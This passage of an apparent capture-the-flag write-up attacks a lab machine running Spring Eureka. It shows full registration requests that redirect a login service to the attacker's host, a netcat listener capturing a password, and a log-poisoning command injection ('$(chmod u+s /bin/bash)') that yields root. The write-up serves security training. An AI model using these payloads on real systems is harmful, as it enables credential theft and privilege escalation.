2025/04/26 22:01:01 CMD: UID=0     PID=474467 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=OWUwNTdkMzItZWY0ZC00NjQwLWFmNzAtOTdmZWExZTZkYzlk -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.Z2v9OfYe4E --insecure -i                                                                                                                                                                                                                                  
2025/04/26 22:01:01 CMD: UID=0     PID=474470 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474473 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=OWUwNTdkMzItZWY0ZC00NjQwLWFmNzAtOTdmZWExZTZkYzlk -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.Z2v9OfYe4E --insecure -i                                                                                                                                                                                                                                  
2025/04/26 22:01:01 CMD: UID=0     PID=474476 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=OWUwNTdkMzItZWY0ZC00NjQwLWFmNzAtOTdmZWExZTZkYzlk -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.Z2v9OfYe4E --insecure -i
```

Furthermore we noticed the execution of `/opt/scripts/miranda-Login-Simulator.sh` which we couldn't read because we were lacking permissions to do so, however it seemed that `curl` was used to make a `login request` on the `Spring Framework` using a static `session cookie`.

```shell
curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=OWUwNTdkMzItZWY0ZC00NjQwLWFmNzAtOTdmZWExZTZkYzlk -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.Z2v9OfYe4E --insecure -i  
```

We `executed` the `script` to get a grasp of the output on an actual logfile.

```shell
oscar190@eureka:/dev/shm$ /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
----- Log Analysis Report -----

[+] Successful Login Counts:

Total Successful Logins: 0                                                                                                                                                                                                                  

[+] Failed Login Attempts:

Total Failed Login Attempts: 0                                                                                                                                                                                                              

[+] HTTP Status Code Distribution:
     0 200
     0 201
     9 302
     0 400
     0 401
    55 403
     0 404
     0 500

Total HTTP Requests Tracked: 64                                                                                                                                                                                                             

[+] Log Level Counts:
   113 INFO
    12 WARN

[+] ERROR Messages:


[+] Eureka Connection Failures:
Count: 1


Analysis completed. Results saved to log_analysis.txt
```

## Enumeration of Port 8761/TCP

Based on the information above we started investigating port `8761/TCP` using the `credentials` we found first to login to the `dashboard` of `Spring Eureka`.

- [http://furni.htb:8761/](http://furni.htb:8761/)

| Username   | Password          |
| ---------- | ----------------- |
| EurekaSrvr | 0scarPWDisTheB3st |

![](images/2025-04-26_21-18_8761_spring_eureka_dashboard.png)

## Attacking Spring Boot Eureka

### Micro-Service Mapping Abuse

We noticed that the `mappings` for the different `applications` and a quick `Google search` lead us the the potential `abuse` of `Micro-Service mappings` in `Spring Eureka`.

- [https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka)

The idea was to `map` the `login page` to our `local machine` in order to catch the `plaintext authentication` made by `miranda-wise`.

```shell
POST /eureka/apps/WEBSERVICE HTTP/1.1
Host: furni.htb:8761
Cache-Control: max-age=0
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://furni.htb:8761/
Accept-Encoding: gzip, deflate, br
Cookie: SESSION=ODU5MTkzZDItNzQ0ZS00MWIzLTkxM2EtOWRlOTY0NWFmODY2; JSESSIONID=0C77FE994AEC3A26E4EC265E0443D8CD
Connection: keep-alive
Content-Length: 1019

{"instance":{"instanceId":"host.docker.internal:webservice:8082","app":"WEBSERVICE","appGroupName":null,"ipAddr":"192.168.2.1","sid":"na","homePageUrl":"http://host.docker.internal:8082/","statusPageUrl":"http://host.docker.internal:8082/actuator/info","healthCheckUrl":"http://host.docker.internal:8082/actuator/health","secureHealthCheckUrl":null,"vipAddress":"webservice","secureVipAddress":"webservice","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"host.docker.internal","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":8082,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8082"}}}


```

Therefore we prepared a payload in order to see if we could manipulate the mappings.

```shell
POST /eureka/apps/FURNI HTTP/1.1
Host: furni.htb:8761
Cache-Control: max-age=0
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://furni.htb:8761/
Accept-Encoding: gzip, deflate, br
Cookie: SESSION=ODU5MTkzZDItNzQ0ZS00MWIzLTkxM2EtOWRlOTY0NWFmODY2; JSESSIONID=0C77FE994AEC3A26E4EC265E0443D8CD
Content-Type: application/json
Connection: keep-alive
Content-Length: 946

{"instance":{"instanceId":"localhost:furni:8082","app":"FURNI","appGroupName":null,"ipAddr":"10.129.140.42","sid":"na","homePageUrl":"http://127.0.0.1:8082/","statusPageUrl":"http://127.0.0.1:8082/actuator/info","healthCheckUrl":"http://127.0.0.1:8082/actuator/health","secureHealthCheckUrl":null,"vipAddress":"furni","secureVipAddress":"furni","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"localhost","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":8082,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8082"}}}


```

```shell
HTTP/1.1 204 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Date: Sat, 26 Apr 2025 19:37:11 GMT
Keep-Alive: timeout=60
Connection: keep-alive


```

And indeed we were able to modify the `FURNI` application to point to an endpoint we controlled.

![](images/2025-04-26_21-37_8761_spring_eureka_adding_host.png)

## Privilege Escalation to miranda-wise

First we modified our payload to see if it would reach out to our box and send a request.

```shell
POST /eureka/apps/FURNI HTTP/1.1
Host: furni.htb:8761
Cache-Control: max-age=0
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://furni.htb:8761/
Accept-Encoding: gzip, deflate, br
Cookie: SESSION=ODU5MTkzZDItNzQ0ZS00MWIzLTkxM2EtOWRlOTY0NWFmODY2; JSESSIONID=0C77FE994AEC3A26E4EC265E0443D8CD
Content-Type: application/json
Connection: keep-alive
Content-Length: 952

{"instance":{"instanceId":"10.10.16.39:furni:8082","app":"FURNI","appGroupName":null,"ipAddr":"10.10.16.39","sid":"na","homePageUrl":"http://10.10.16.39:8082/","statusPageUrl":"http://10.10.16.39:8082/actuator/info","healthCheckUrl":"http://10.10.16.39:8082/actuator/health","secureHealthCheckUrl":null,"vipAddress":"furni","secureVipAddress":"furni","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"localhost","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":8082,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8082"}}}


```

```shell
HTTP/1.1 204 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Date: Sat, 26 Apr 2025 19:44:23 GMT
Keep-Alive: timeout=60
Connection: keep-alive


```

We needed to trigger it manually via the `dashboard` but it worked! The application was calling our `webserver`.

![](images/2025-04-26_21-41_8761_spring_eureka_ssrf.png)

![](images/2025-04-26_21-51_8082_spring_eureka_ssrf_trigger.png)

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Eureka/serve]
└─$ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.16.39 - - [26/Apr/2025 21:44:58] code 404, message File not found
10.10.16.39 - - [26/Apr/2025 21:44:58] "GET /actuator/info HTTP/1.1" 404 -
10.10.16.39 - - [26/Apr/2025 21:44:58] code 404, message File not found
10.10.16.39 - - [26/Apr/2025 21:44:58] "GET /favicon.ico HTTP/1.1" 404 -
```

After quite some tinkering the man `ethicxz` himself came up with a working solution to catch the `authentication` on port `80/TCP` of our local listener.

```shell
POST /eureka/apps/USER-MANAGEMENT-SERVICE HTTP/1.1
Host: furni.htb:8761
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Connection: keep-alive
Cookie: JSESSIONID=56070E3D12C85346752F1436909D3730; SESSION=NjVjOTQyNWMtYjg4MC00OGM1LTk1MGQtZjNjZDdmZmUzYzkx
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Priority: u=0, i
Content-Length: 1006

{"instance":{"instanceId":"furni.htb:USER-MANAGEMENT-SERVICE:8081","app":"USER-MANAGEMENT-SERVICE","appGroupName":null,"ipAddr":"10.10.16.39:8081","sid":"na","homePageUrl":"http://10.10.16.39:8081/login","statusPageUrl":"http://furni.htb:8081/login","healthCheckUrl":"http://furni.htb:8081/login","secureHealthCheckUrl":null,"vipAddress":"user-management-service","secureVipAddress":"user-management-service","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"10.10.16.39","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":80,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8081"}}}
```

```shell
HTTP/1.1 204 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Date: Mon, 28 Apr 2025 11:36:50 GMT
Keep-Alive: timeout=60
Connection: keep-alive


```

![](images/2025-04-28_13-39_burp_suite_micro_service_mapping_request.png)

We checked if the `mapping` was modified to our needs and waited for the `cronjob` to get executed.

![](images/2025-04-28_09-17_8761_spring_eureka_local_machine.png)

And after a little while the box reached out and provided us the partially `URL encoded password` for `miranda-wise`.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.82.10] 41154
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=MzNkNTExOWYtOGE5Yy00MjdlLTg4M2QtZmFkNmFjZjRmMjQ3
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:42784"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.16.39

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=CD9HUkRayeBCvcmC8che2TjnhCb9IM9H-I8HEDaeN1PROQSIOAl0MSZsrNNvi_i0w-VqugjVqUfFGP5qzuo_KFL7DjK3D2K4
```

| Username     | Password           |
| ------------ | ------------------ |
| miranda-wise | IL!veT0Be&BeT0L0ve |

```shell
┌──(kali㉿kali)-[~]
└─$ ssh miranda-wise@10.129.196.154
miranda-wise@10.129.196.154's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-214-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 28 Apr 2025 07:26:49 AM UTC

  System load:           0.32
  Usage of /:            68.8% of 6.79GB
  Memory usage:          51%
  Swap usage:            0%
  Processes:             244
  Users logged in:       1
  IPv4 address for eth0: 10.129.196.154
  IPv6 address for eth0: dead:beef::250:56ff:feb0:3cca


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 28 07:26:50 2025 from 10.10.16.39
miranda-wise@eureka:~$
```

## user.txt

We grabbed the `user.txt` and moved on.

```shell
miranda-wise@eureka:~$ cat user.txt 
bb6f7d9344688d8b253b9b851f179b62
```

## Enumeration (miranda-wise)

Now with a session of `miranda-wise` we repeated the `process` of `enumeration` and right away spotted that she was member of the `developers group`.

```shell
miranda-wise@eureka:~$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
```

```shell
miranda-wise@eureka:~$ sudo -l
[sudo] password for miranda-wise: 
Sorry, user miranda-wise may not run sudo on localhost.
```

```shell
miranda-wise@eureka:~$ ls -lah
total 48K
drwxr-x--- 8 miranda-wise miranda-wise 4.0K Mar 21 13:26 .
drwxr-xr-x 4 root         root         4.0K Aug  9  2024 ..
lrwxrwxrwx 1 root         root            9 Aug  7  2024 .bash_history -> /dev/null
-rw-r--r-- 1 miranda-wise miranda-wise  220 Aug  1  2024 .bash_logout
-rw-r--r-- 1 miranda-wise miranda-wise 3.7K Aug  1  2024 .bashrc
drwx------ 2 miranda-wise miranda-wise 4.0K Aug  5  2024 .cache
drwx------ 3 miranda-wise miranda-wise 4.0K Aug  9  2024 .config
drwx------ 3 miranda-wise miranda-wise 4.0K Apr 27 17:12 .gnupg
drwxrwxr-x 3 miranda-wise miranda-wise 4.0K Aug  7  2024 .local
drwxr-xr-x 3 miranda-wise miranda-wise 4.0K Aug  5  2024 .m2
-rw-r--r-- 1 miranda-wise miranda-wise  807 Aug  1  2024 .profile
drwx------ 3 miranda-wise miranda-wise 4.0K Aug  9  2024 snap
-rw-r----- 1 root         miranda-wise   33 Apr 27 16:20 user.txt
```

We could searched for every folder accessible by members of the `developers group` but instead we decided to double check the `/var/wwww/web` folder and the corresponding `permissions` directly.

What we noticed was that members of this group had `full permission` over each of the `instance folders` like `cloud-gateway` and `user-management-service`.

```shell
miranda-wise@eureka:/var/www/web$ ls -lah
total 28K
drwxrwxr-x 7 www-data developers 4.0K Mar 18 21:19 .
drwxr-xr-x 4 root     root       4.0K Apr 10 07:25 ..
drwxrwxr-x 7 www-data developers 4.0K Apr 28 09:40 cloud-gateway
drwxrwxr-x 5 www-data developers 4.0K Aug  5  2024 Eureka-Server
drwxrwxr-x 5 www-data developers 4.0K Aug  5  2024 Furni
drwxrwxr-x 6 www-data developers 4.0K Jul 23  2024 static
drwxrwxr-x 6 www-data developers 4.0K Apr 28 09:44 user-management-service
```

Within the folders itself the same picture appeared.

```shell
miranda-wise@eureka:/var/www/web/user-management-service$ ls -lah
total 60K
drwxrwxr-x 6 www-data     developers   4.0K Apr 28 09:44 .
drwxrwxr-x 7 www-data     developers   4.0K Mar 18 21:19 ..
-rwxrwxr-x 1 www-data     developers    395 Aug  3  2024 .gitignore
-rwxrwxr-x 1 www-data     developers   1.8K Aug  3  2024 HELP.md
drwxrwxr-x 3 www-data     developers   4.0K Apr 28 11:25 log
drwxrwxr-x 3 www-data     developers   4.0K Aug  3  2024 .mvn
-rwxrwxr-x 1 www-data     developers    11K Aug  3  2024 mvnw
-rwxrwxr-x 1 www-data     developers   6.8K Aug  3  2024 mvnw.cmd
-rwxrwxr-x 1 www-data     developers   2.4K Aug  3  2024 pom.xml
-rwxrwxr-x 1 miranda-wise miranda-wise  291 Apr 28 09:44 script.sh
drwxrwxr-x 4 www-data     developers   4.0K Aug  3  2024 src
drwxrwxr-x 9 www-data     developers   4.0K Mar 19 22:07 target
```

However inside the `/log` folder only `www-data` had permission to change the content of the files because of the `rw-` permissions set on those.

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ ls -lah
total 48K
drwxrwxr-x 3 www-data developers 4.0K Apr 28 11:25 .
drwxrwxr-x 6 www-data developers 4.0K Apr 28 09:44 ..
-rw-rw-r-- 1 www-data www-data    17K Apr 28 11:42 application.log
-rw-rw-r-- 1 www-data www-data   6.5K Apr 23 07:36 application.log.2025-04-22.0.gz
-rw-rw-r-- 1 www-data www-data   6.5K Apr 28 07:53 application.log.2025-04-23.0.gz
drwxrwxr-x 2 www-data www-data   4.0K Apr  9 18:20 archive
```

## Privilege Escalation to root

The fact that `developers` had `full control` over the `folder` containing the `logfiles` enabled us not edit the files but `replace` them!

So we analyzed the script we found within the session of `oscar190` and noticed that when the script got `executed` by `root`, it used took whatever was inserted as `username` and printed it without any further checks.

That meant it was potentially vulnerable to `command injection` if we would be able to `poison the logfiles` parsed while the `cronjob` was running.

Our payload was to simply set the `SUID` bit on `/bin/bash` for an easy `privesc` to `root`.

According to the extensive testing of `ethicxz` we need to have our payload at least two times in our malicious `a.log` in order to having the script execute it before `moveing` it to `application.log` and therefore overwriting the original file.

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ cat a.log
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
```

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ mv a.log application.log
mv: replace 'application.log', overriding mode 0664 (rw-rw-r--)? y
```

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ cat application.log
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
2025-04-27 18:00:00 INFO LoginSuccessLogger: '$(chmod u+s /bin/bash)'
```

Later in `display_results`, the script did this:

- `${!successful_users[@]}` iterated over **the keys** of the associative array.
- `$user` hold the string `$(chmod u+s /bin/bash)`.
- Then **this key** was printed using `printf` in Bash **without escaping or sanitization**.

Now, even though it was inside `printf`, **bash expanded variables before calling `printf`**.

And we got the `SUID` bit set on `/bin/bash` as expected.

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /bin/bash
```

```shell
miranda-wise@eureka:/var/www/web/user-management-service/log$ /bin/bash -p
bash-5.0#
```

## root.txt

```shell
bash-5.0# cat /root/root.txt
8f0072f942f13ca12e41fbe9706388b1
```
